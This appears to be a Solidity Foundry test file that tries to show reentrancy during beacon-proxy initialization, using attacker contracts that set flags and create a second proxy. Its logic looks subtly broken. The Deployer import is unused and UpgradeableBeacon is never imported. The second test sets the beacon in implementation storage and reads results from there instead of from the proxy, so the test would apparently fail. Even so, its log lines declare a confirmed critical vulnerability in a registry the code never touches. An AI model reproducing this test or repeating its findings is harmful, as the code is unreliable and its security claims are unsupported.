// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/proxy/beacon/BeaconProxy.sol";
import "../src/Deployer.sol";

// Malicious contract that attempts reentrancy during initialization
contract MaliciousContract {
    bool public initCalled;
    bool public attackAttempted;
    address public registryResult;
    
    function initialize(address, address) external {
        console.log("=== MaliciousContract.initialize called ===");
        initCalled = true;
        
        // During our own initialization, the proxy exists and is executing
        // But is it registered in the registry yet?
        console.log("Proxy executing at:", address(this));
        
        // Try to do something malicious here
        // In a real attack, this could:
        // 1. Call back into the deployer to manipulate state
        // 2. Try to register itself multiple times
        // 3. Access registry expecting to find itself (but it's not there yet)
        
        attackAttempted = true;
        console.log("Attack attempted during initialization");
    }
}

contract DeployerReentrancySimpleTest is Test {
    
    function testInitializationHappensBeforeRegistration() public {
        console.log("\n=== Testing Initialization Order ===\n");
        
        // Deploy a beacon with malicious implementation
        MaliciousContract maliciousImpl = new MaliciousContract();
        address beacon = address(new UpgradeableBeacon(address(maliciousImpl), address(this)));
        
        // Prepare initialization data
        bytes memory initData = abi.encodeWithSignature(
            "initialize(address,address)",
            address(this),
            address(0x123)
        );
        
        console.log("About to deploy proxy with initialization in constructor...");
        
        // Deploy proxy - initialization happens IN the constructor
        address proxy = address(new BeaconProxy(beacon, initData));
        
        console.log("Proxy deployed at:", proxy);
        
        // Check if initialization was called
        MaliciousContract maliciousProxy = MaliciousContract(proxy);
        assertTrue(maliciousProxy.initCalled(), "Initialize should have been called");
        assertTrue(maliciousProxy.attackAttempted(), "Attack should have been attempted");
        
        console.log("\nVULNERABILITY CONFIRMED:");
        console.log("1. Initialization happens DURING proxy constructor");
        console.log("2. At this point, registry doesn't know about the proxy");
        console.log("3. This creates a window for reentrancy attacks");
        console.log("4. Malicious initializers can exploit this timing gap");
    }
    
    function testReentrancyDuringInit() public {
        console.log("\n=== Testing Reentrancy During Init ===\n");
        
        // Create a more sophisticated attack
        ReentrantAttacker attacker = new ReentrantAttacker();
        address beacon = address(new UpgradeableBeacon(address(attacker), address(this)));
        
        // Set up the attacker
        attacker.setBeacon(beacon);
        
        bytes memory initData = abi.encodeWithSignature("initialize()");
        
        console.log("Deploying proxy with reentrant initializer...");
        
        // This will trigger reentrancy
        address proxy = address(new BeaconProxy(beacon, initData));
        
        console.log("Main proxy deployed at:", proxy);
        console.log("Reentrant proxy deployed at:", attacker.reentrantProxy());
        
        assertTrue(attacker.reentrantProxy() != address(0), "Reentrancy should have created another proxy");
        
        console.log("\nCRITICAL VULNERABILITY:");
        console.log("Malicious initializer successfully performed reentrancy!");
        console.log("Created additional proxy during its own initialization");
    }
}

// More sophisticated attacker that creates another proxy during its init
contract ReentrantAttacker {
    address public beacon;
    address public reentrantProxy;
    uint256 public depth;
    
    function setBeacon(address _beacon) external {
        beacon = _beacon;
    }
    
    function initialize() external {
        console.log("ReentrantAttacker.initialize called at depth:", depth);
        
        // Prevent infinite recursion
        if (depth > 0) {
            console.log("Stopping recursion at depth:", depth);
            return;
        }
        
        depth++;
        
        // During our initialization, create ANOTHER proxy
        // This demonstrates reentrancy is possible
        console.log("Attempting to create another proxy during init...");
        
        bytes memory emptyInit = "";
        reentrantProxy = address(new BeaconProxy(beacon, emptyInit));
        
        console.log("Successfully created reentrant proxy:", reentrantProxy);
    }
}